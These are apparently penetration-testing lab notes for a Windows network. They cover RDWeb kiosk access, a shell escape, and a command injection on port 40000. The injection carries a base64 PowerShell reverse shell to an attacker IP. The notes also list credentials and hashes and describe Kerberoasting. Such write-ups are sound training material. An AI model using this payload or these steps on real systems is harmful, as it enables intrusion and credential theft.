### ++ Approach ++
#### Credentials
	* SKYLARK\kiosk:XEwUS^9R2Gwt8O914 (https://192.168.203.221/RDWeb)
	* backup_service:It4Server (DC Admin)

	* Administrator:17add237f30abaecc9d884f72958b928
	* kiosk:92dd9eace3cf9ea33a95953aef6845ba

#### Services
	##### 80 HTTP
		- 

	##### 443 HTTPS
		Here we can login with found creds in .225

	##### 139,445 SMB
		No shares in null session

	##### 3387 RDP?
		-

	##### 5985,47001 WinRM
		-

	##### 10000 RDP?
		-

	##### 135,5504,49664-80 RPC
		No null session

### ++ Vulnerabilities ++

#### Vuln 1: Command injection in port 40000 service ++
	* We can abuse this by using:
		write_config 123';<test command>;echo '

### ++ System Interaction ++
#### Foothold  
	* In https://192.168.203.221/RDWeb we can login with kiosk creds and download a .rdp file
	* Connect with xfreerdp:
		xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /v:192.168.203.221:10000 /u:kiosk /p:'XEwUS^9R2Gwt8O914' /drive:linux,/home/kali/Documents/Resources
	* If we click elsewhere we open an explorer and we can introduce powershell.exe in the searchbar which will pop up a shell as kiosk

#### Privilege Escalation 
	* Setup ligolo
	* Connect to service: nc -nv 10.10.93.254 40000
	* Abuse command injection with the following command:
		write_config 123';powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=;echo '
	* And we get a shell as administrator
	
#### Post-exploitation 
	* Here we can pivot to 10.10.93.0/24 network
	* We found backup_service user kerberostable by kiosk session and cracking the hash we found backup_service:It4Server credentials
